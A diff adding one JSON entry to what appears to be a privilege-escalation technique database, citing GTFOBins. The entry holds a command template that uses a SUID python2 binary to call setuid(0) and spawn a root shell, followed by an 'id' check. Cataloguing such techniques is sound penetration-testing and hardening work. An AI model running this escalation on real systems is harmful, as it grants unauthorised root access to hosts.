@@ -1,0 +1,11 @@
+{
+  "id": "suid_python2",
+  "category": "SUID_GTFOBINS",
+  "binary": "python2",
+  "cve": null,
+  "exploitation": ["{{binary}} -c 'import os; os.setuid(0); os.system(\"{{shell}}\")'"],
+  "post_exploit": ["id"],
+  "source": "gtfobins.github.io",
+  "tags": ["suid", "gtfobins"],
+  "severity": "high"
+}
